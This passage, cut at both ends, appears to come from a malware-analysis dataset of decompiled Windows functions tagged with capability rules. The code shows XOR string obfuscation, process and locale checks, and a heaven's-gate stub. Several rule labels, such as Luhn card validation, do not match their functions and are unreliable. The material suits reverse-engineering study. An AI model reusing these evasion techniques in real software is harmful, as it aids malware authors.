iVar4 = 0;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar5 != 0x4fbb1a) {\n            *(iVar4 + var_90h) = *(&var_28h + iVar4 % var_2ch) ^ (iVar4 + var_90h)[&var_8h - var_90h];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 6);\n    var_8h = 0xf3f140f;\n    var_4h._0_1_ = 0x35;\n    var_28h = 0x57705659;\n    var_24h._0_2_ = 0x5635;\n    fcn.00401000(5);\n    iVar4 = var_70h;\n    iVar9 = 0;\n    iVar5 = &var_8h - var_70h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar6 != 0xe0d02c) {\n            *(iVar9 + iVar4) = *(&var_28h + iVar9 % var_2ch) ^ (iVar9 + iVar4)[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 5);\n    var_8h = 0x60352d3c;\n    var_4h._0_1_ = 0x4a;\n    var_28h = 0x3578686d;\n    var_24h._0_2_ = 0x734a;\n    fcn.00401000(5);\n    iVar4 = var_80h;\n    iVar9 = 0;\n    iVar5 = &var_8h - var_80h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar6 != 0x11e00d) {\n            *(iVar9 + iVar4) = *(&var_28h + iVar9 % var_2ch) ^ (iVar9 + iVar4)[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 5);\n    var_8h = 0x129352a;\n    var_4h._0_1_ = 0x37;\n    var_28h = 0x486a7879;\n    var_24h._0_2_ = 0x3137;\n    fcn.00401000(5);\n    iVar4 = var_78h;\n    iVar9 = 0;\n    iVar5 = &var_8h - var_78h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar6 != 0x4dbfc8) {\n            *(iVar9 + iVar4) = *(&var_28h + iVar9 % var_2ch) ^ (iVar9 + iVar4)[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 5);\n    var_1ch._0_2_ = 0x726;\n    var_1ch._2_1_ = 0x3c;\n    var_1ch._3_1_ = 9;\n    var_18h._0_2_ = 0x5518;\n    var_18h._2_1_ = 0x4f;\n    stack0xffffffe7 = 0x647a4864;\n    stack0xffffffeb = 0x58795f41;\n    var_10h._3_1_ = 0x7c;\n    var_ch._0_1_ = 0x54;\n    var_8h = 0x4c68496f;\n    var_4h._0_1_ = 0x54;\n    var_4h._1_1_ = 0x75;\n    fcn.00401000(0x11);\n    iVar4 = var_74h;\n    iVar9 = 0;\n    iVar5 = &var_1ch - var_74h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar6 != 0x5a9b76) {\n            *(iVar9 + iVar4) = *(&var_8h + iVar9 % var_2ch) ^ (iVar9 + iVar4)[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x11);\n    stack0xffffffeb = stack0xffffffeb & 0xff | 0x3c233600;\n    var_10h._3_1_ = 0x6d;\n    var_ch._0_1_ = 0x49;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 0x77;\n    var_8h = 0x39727770;\n    var_4h._0_1_ = 100;\n    fcn.00401000(7);\n    iVar4 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar5 != 0xd74ed7) {\n            *(iVar4 + var_8ch) = *(&var_8h + iVar4 % var_5ch) ^ (iVar4 + var_8ch)[&var_10h - var_8ch];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 7);\n    var_8h = 0x2118042b;\n    var_4h._0_1_ = 0x50;\n    var_64h = 0x68564b78;\n    var_60h._0_2_ = 0x5050;\n    fcn.00401000(5);\n    iVar4 = var_28h;\n    iVar9 = 0;\n    iVar5 = &var_8h - var_28h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar6 != 0xd9ea97) {\n            puVar8 = iVar9 + iVar4;\n            *puVar8 = *(&var_64h + iVar9 % var_2ch) ^ puVar8[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 5);\n    *0x41d220 = var_84h;\n    *0x41d228 = var_90h;\n    *0x41d22c = var_70h;\n    *0x41d230 = var_80h;\n    *0x41d234 = var_78h;\n    *0x41d240 = iVar4;\n    uVar10 = 0;\n    *0x41d238 = var_74h;\n    *0x41d23c = var_8ch;\n    do {\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ce10, *(uVar10 + 0x41d220));\n        if (iVar4 != 0) {\n            fcn.0040dec6();\n        }\n        uVar10 = uVar10 + 4;\n    } while (uVar10 < 0x20);\n    var_1ch._0_2_ = 0x3d3b;\n    var_1ch._2_1_ = 6;\n    var_1ch._3_1_ = 0x2a;\n    var_18h._0_2_ = 0x2119;\n    var_18h._2_1_ = 4;\n    stack0xffffffe7 = 0x1319113b;\n    stack0xffffffeb = 0xd3d1e11;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 0x76;\n    var_8h = 0x4f62546d;\n    var_4h._0_1_ = 0x76;\n    var_4h._1_1_ = 99;\n    fcn.00401000(0x11);\n    iVar4 = var_68h;\n    iVar9 = 0;\n    iVar5 = &var_1ch - var_68h;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar8 = extraout_ECX_00;\n        if (iVar6 != 0x187d09) {\n            puVar8 = iVar9 + iVar4;\n            *puVar8 = *(&var_8h + iVar9 % var_2ch) ^ puVar8[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x11);\n    cVar3 = fcn.0040dcbe(puVar8, puVar8);\n    if (cVar3 == '\\0') {\n        fcn.0040dec6();\n    }\n    stack0xffffffe7 = stack0xffffffe7 & 0xff | 0x1f1a1300;\n    stack0xffffffeb = 0x1f24472e;\n    var_10h._3_1_ = 0x2f;\n    var_ch._0_1_ = 0x35;\n    var_ch._1_1_ = 0x4a;\n    var_ch._2_1_ = 0x45;\n    var_8h = 0x5a6d7345;\n    var_4h._0_1_ = 0x32;\n    fcn.00401000(0xb);\n    iVar4 = var_64h;\n    iVar9 = 0;\n    iVar5 = &var_14h - var_64h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar6 != 0x43a462) {\n            puVar8 = iVar9 + iVar4;\n            *puVar8 = *(&var_8h + iVar9 % var_5ch) ^ puVar8[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xb);\n    iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ce10, iVar4);\n    if (iVar4 != 0) {\n        fcn.0040dec6();\n    }\n    var_58h = 0x370e2429;\n    var_54h = 0xd393b39;\n    var_50h = 0x813233f;\n    var_4ch = 0x151d0c3a;\n    var_48h = 0x393f3c0d;\n    var_44h._0_1_ = 0x13;\n    var_44h._1_1_ = 5;\n    var_44h._2_2_ = 0xc2c;\n    var_40h._0_2_ = 0x919;\n    var_40h._2_2_ = 0xb37;\n    var_3ch._0_2_ = 0x1c16;\n    var_3ch._2_2_ = 0xe08;\n    var_38h._0_2_ = 0x1726;\n    var_38h._2_2_ = 0x1f38;\n    var_34h._0_2_ = 0x3b19;\n    var_34h._2_2_ = 0x10a;\n    uStack52 = 0x6b14;\n    var_8h = 0x63486b7a;\n    var_4h._0_1_ = 0x6e;\n    fcn.00401000(0x2a);\n    iVar4 = 0;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        puVar8 = extraout_ECX_01;\n        if (iVar5 != 0x504ad1) {\n            puVar8 = iVar4 + var_a0h;\n            *puVar8 = *(&var_8h + iVar4 % var_5ch) ^ puVar8[&var_58h - var_a0h];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x2a);\n    cVar3 = fcn.0040dcbe(puVar8, puVar8);\n    if (cVar3 == '\\0') {\n        fcn.0040dec6();\n    }\n    var_20h = 0x447e7972;\n    var_1ch._0_2_ = 0x6a75;\n    var_1ch._2_1_ = 0x7a;\n    var_1ch._3_1_ = 0x78;\n    var_18h._0_2_ = 0x6c43;\n    var_18h._2_1_ = 0x75;\n    stack0xffffffe7 = 0x71407b7a;\n    stack0xffffffeb = 0x41617871;\n    var_10h._3_1_ = 0x72;\n    var_ch._0_1_ = 0x7e;\n    var_ch._1_1_ = 0x79;\n    var_ch._2_1_ = 0x7c;\n    var_ch._3_1_ = 0x73;\n    var_8h = 0x734c4c47;\n    var_4h._0_1_ = 0x41;\n    fcn.00401000(0x18);\n    iVar4 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar5 != 0xd8c5aa) {\n            *(iVar4 + var_94h) = *(&var_8h + iVar4 % var_5ch) ^ (iVar4 + var_94h)[&var_20h - var_94h];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x18);\n    iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ce10, var_94h);\n    if (iVar4 != 0) {\n        fcn.0040dec6();\n    }\n    var_48h = 0x5d5f5d61;\n    var_44h._0_1_ = 0x75;\n    var_44h._1_1_ = 0x77;\n    var_44h._2_2_ = 0x5f60;\n    var_40h._0_2_ = 0x485f;\n    var_40h._2_2_ = 0x6b71;\n    var_3ch._0_2_ = 0x5c61;\n    var_3ch._2_2_ = 0x565b;\n    var_38h._0_2_ = 0x7775;\n    var_38h._2_2_ = 0x5864;\n    var_34h._0_2_ = 0x545e;\n    var_34h._2_2_ = 0x5a72;\n    stack0xffffffeb = stack0xffffffeb & 0xff | 0x6b6b5600;\n    var_10h._3_1_ = 0x65;\n    var_ch._0_1_ = 0x42;\n    var_ch._1_1_ = 0x5a;\n    fcn.00401000(0x18);\n    iVar4 = var_5ch;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    iVar5 = 0;\n    var_8h = &var_48h - var_5ch;\n    do {\n        iVar9 = (*pcVar2)();\n        if (iVar9 != 0xe5320c) {\n            puVar8 = iVar5 + iVar4;\n            *puVar8 = *(&var_10h + iVar5 % var_2ch) ^ puVar8[var_8h];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ce10, iVar4);\n    if (iVar4 != 0) {\n        fcn.0040dec6();\n    }\n    var_48h = 0x5e72607f;\n    var_44h._0_1_ = 0x5c;\n    var_44h._1_1_ = 0x4a;\n    var_44h._2_2_ = 0x657b;\n    var_40h._0_2_ = 0x4b71;\n    var_40h._2_2_ = 0x5353;\n    var_3ch._0_2_ = 0x6f7a;\n    var_3ch._2_2_ = 0x537f;\n    var_38h._0_2_ = 0x4a5e;\n    var_38h._2_2_ = 0x647a;\n    var_34h._0_2_ = 0x5770;\n    var_34h._2_2_ = 0x675f;\n    stack0xffffffeb = stack0xffffffeb & 0xff | 0x46564800;\n    var_10h._3_1_ = 0x66;\n    var_ch._0_1_ = 0x6b;\n    var_ch._1_1_ = 0x67;\n    fcn.00401000(0x18);\n    iVar4 = var_8h;\n    iVar5 = 0;\n    var_8h = &var_48h - var_8h;\n    do {\n        iVar9 = (*pcVar2)();\n        if (iVar9 != 0xd5c1f4) {\n            *(iVar5 + iVar4) = *(&var_10h + iVar5 % var_2ch) ^ (iVar5 + iVar4)[var_8h];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41ce10, iVar4);\n    iVar5 = var_5ch;\n    if (iVar9 != 0) {\n        fcn.0040dec6();\n    }\n    uVar7 = (*pcVar2)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_94h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_64h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_68h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_28h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_8ch);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_74h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_84h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_7ch);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_6ch);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_9ch);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_ach);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_a4h);\n    (*pcVar1)(uVar7);\n    uVar7 = (*pcVar2)(0, var_98h);\n    uVar10 = (*pcVar1)(uVar7);\n    return uVar10 & 0xffffff00;\n}\n",
        "token_count": 8349
    },
    "00406ef1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406ef1(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCuT._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCuT._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCuT._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCuT._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41cd38 = 1;\n            *0x41200c = 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0040bc8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040bc8c(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uchar var_1bh;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpLibFileName;\n    \n    var_24h = 0x2c42252a;\n    var_10h = 6;\n    var_20h = 0x6722225;\n    var_1ch = 0x4d;\n    var_18h = 0x4d34414b;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x55);\n    fcn.00401000(9);\n    iVar6 = lpLibFileName;\n    iVar5 = 0;\n    iVar4 = &var_24h - lpLibFileName;\n    do {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar2 != 0x638602) {\n            var_ch = 5;\n            puVar1 = iVar5 + iVar6;\n            *puVar1 = *(&var_18h + iVar5 % 5) ^ puVar1[iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 9);\n    if (*0x41cdf0 == NULL) {\n        var_2ch = 0x433e2c3f;\n        var_28h = 0x202a0755;\n        var_24h = 0x3445423;\n        var_20h = 0x47d3b03;\n        var_1ch = 6;\n        var_1bh = 0x6a;\n        var_18h = 0x374d556c;\n        var_14h._0_2_ = 0x6a30;\n        fcn.00401000(0x12);\n        iVar6 = var_ch;\n        iVar5 = 0;\n        iVar4 = &var_2ch - var_ch;\n        do {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n            if (iVar2 != 0x646d87) {\n                *(iVar5 + iVar6) = *(&var_18h + iVar5 % var_10h) ^ (iVar5 + iVar6)[iVar4];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x12);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41cdf0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar6 = lpLibFileName;\n    }\n    (**0x41cdf0)(&var_8h, 4);\n    if (var_8h < 0) {\n        var_8h = -var_8h;\n    }\n    iVar4 = var_8h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return iVar4;\n}\n",
        "token_count": 837
    },
    "00408dbc": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00408dbc(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x4e);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if (param_2 == 0) {\n        var_4ch = 0x43655975;\n        var_48h = 0x59086761;\n        var_44h = 0x67694370;\n        var_40h = 0x430d5964;\n        var_3ch = 0x5960677c;\n        var_38h = 0x67014361;\n        var_34h = 0x43655975;\n        var_30h = 0x5908676d;\n        var_2ch = 0x67694370;\n        var_28h = 0x430d5968;\n        var_24h = 0x5960677c;\n        var_20h = 0x67014361;\n        var_1ch._0_2_ = 0x5950;\n        var_18h = 0x43555950;\n        var_14h._0_2_ = 0x6759;\n        fcn.00401000(100);\n        iVar3 = 0;\n        var_4h = 6;\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar2 != 0x6e2155) {\n                *(iVar3 + var_8h) = *(&var_18h + iVar3 % var_4h) ^ (iVar3 + var_8h)[&var_4ch - var_8h];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x32);\n    }\n    else {\n        var_50h = 0x4e4a3734;\n        var_4ch = 0x37776b64;\n        var_48h = 0x6b714e37;\n        var_44h = 0x4e5b377f;\n        var_40h = 0x376a6b0c;\n        var_3ch = 0x6b604e5f;\n        var_38h = 0x4e4a3717;\n        var_34h = 0x377b6b64;\n        var_30h = 0x6b714e37;\n        var_2ch = 0x4e57377f;\n        var_28h = 0x376a6b0c;\n        var_24h = 0x6b604e5f;\n        var_20h = 0x4e123717;\n        var_1ch._0_2_ = 0x6b54;\n        var_18h = 0x4e6f374f;\n        var_14h._0_2_ = 0x6b54;\n        fcn.00401000(0x6c);\n        var_8h = var_4h;\n        iVar3 = 0;\n        var_4h = 6;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n            if (iVar2 != 0xdbe447) {\n                *(iVar3 + var_8h) = *(&var_18h + iVar3 % var_4h) ^ (iVar3 + var_8h)[&var_50h - var_8h];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x36);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar3 = var_ch;\n    if (var_ch != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (var_ch, var_8h, CONCAT31(CONCAT21(CONCAT11(*var_10h, var_10h[1]), var_10h[2]), var_10h[3]), \n                   CONCAT11(var_10h[4], var_10h[5]), CONCAT11(var_10h[6], var_10h[7]), CONCAT11(var_10h[8], var_10h[9])\n                   , CONCAT31(CONCAT21(CONCAT11(var_10h[10], var_10h[0xb]), var_10h[0xc]), var_10h[0xd]), \n                   CONCAT11(var_10h[0xe], var_10h[0xf]));\n    }\n    return iVar3;\n}\n",
        "token_count": 1230
    },
    "0040dd1a": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040dd1a(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t lpLibFileName;\n    uint var_4h;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_4h = 0;\n    var_28h = 0x3b301137;\n    var_24h = 0x176f513d;\n    var_10h = 5;\n    var_20h = var_20h & 0xff000000 | 0x650505;\n    var_18h = 0x69734165;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x69);\n    fcn.00401000(0xb);\n    iVar3 = lpLibFileName;\n    iVar9 = 0;\n    iVar10 = &var_28h - lpLibFileName;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar4 != 0x897564) {\n            *(iVar9 + iVar3) = *(&var_18h + iVar9 % var_10h) ^ (iVar9 + iVar3)[iVar10];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xb);\n    var_30h = 0x8223637;\n    var_2ch = 0x22073171;\n    var_28h = 0x2661093f;\n    var_24h = 0x22e3613;\n    var_20h = 0x2f032a46;\n    var_1ch = 0x4b;\n    var_18h = 0x6c4b4362;\n    var_14h._0_2_ = 0x4332;\n    fcn.00401000(0x15);\n    iVar3 = var_10h;\n    iVar10 = 0;\n    var_ch = &var_30h - var_10h;\n    uVar8 = 0;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar9 != 0x7de7ad) {\n            var_10h = 6;\n            *(iVar10 + iVar3) = *(&var_18h + iVar10 % 6) ^ (iVar10 + iVar3)[var_ch];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x15);\n    uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n    if (pcVar6 == NULL) {\n        var_4h = 0;\n    }\n    else {\n        (*pcVar6)(&var_40h);\n        uVar2 = var_36h;\n        var_36h = var_36h & 0xffffff;\n        uVar7 = 0;\n        do {\n            if (((uVar2 & 0xff0000) >> 8 | (var_36h << 0x10 | uVar2 & 0xff00) << 8) == (&var_60h)[uVar7]) {\n                uVar8 = 1;\n            }\n            uVar7 = uVar7 + 1;\n            var_4h = uVar8;\n        } while (uVar7 < 8);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar1)(0, lpLibFileName);\n    (*pcVar6)(uVar8);\n    return var_4h;\n}\n",
        "token_count": 1177
    },
    "0040ef30": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040ef30(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.0040ef85(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 185
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    // [00] -r-x section size 57344 named .text\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h + 1);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    *in_ECX = iVar2;\n    if (iVar2 != 0) {\n        sub.ntdll.dll_memset(iVar2, 0, arg_8h + 1);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00401468": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00401468(uint *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    code *pcVar9;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t hObject;\n    uint ARG_0;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint *dwProcessId;\n    uint pSessionId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    dwProcessId = param_1;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x104;\n    var_10h = puVar3;\n    uVar2 = (*pcVar8)(0, 0x208);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_20h = 0x104;\n    var_1ch = 0;\n    var_8h = 0;\n    pSessionId = 0;\n    iVar6 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar6 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar6 != 0) || (TokenHandle == 0)) {\n                iVar6 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar6 != 0) {\n                   